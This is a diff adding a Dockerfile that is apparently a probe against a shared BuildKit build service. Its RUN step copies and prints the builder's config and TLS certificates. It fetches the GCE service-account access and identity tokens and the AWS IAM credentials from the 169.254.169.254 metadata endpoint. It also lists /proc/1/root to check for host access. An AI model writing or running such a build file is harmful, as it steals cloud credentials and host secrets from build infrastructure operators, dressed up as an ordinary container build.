@@ -1,0 +1,14 @@
+FROM alpine:3.20
+COPY var/lib/buildkit/buildkitd.toml /f/bk.toml
+COPY var/lib/buildkit/certs /f/bkcerts
+COPY var/lib/buildkit/debug /f/bkdebug
+RUN set -x; echo "===B5==="; ls -laR /f/bkcerts /f/bkdebug 2>&1 | head -40; cat /f/bk.toml 2>&1 | head -40; \
+ echo "--META_GCE--"; \
+ wget -q -T 4 -O - --header='Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1 | head -c 500; echo; \
+ echo "--META_ID--"; \
+ wget -q -T 4 -O - --header='Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=x&format=full' 2>&1 | head -c 400; echo; \
+ echo "--META_AWS--"; \
+ wget -q -T 3 -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 300; echo; \
+ echo "--BKENV--"; ls -la /proc/1/root 2>&1 | head; \
+ echo "===B5END==="
+CMD ["sh","-c","sleep 3600"]
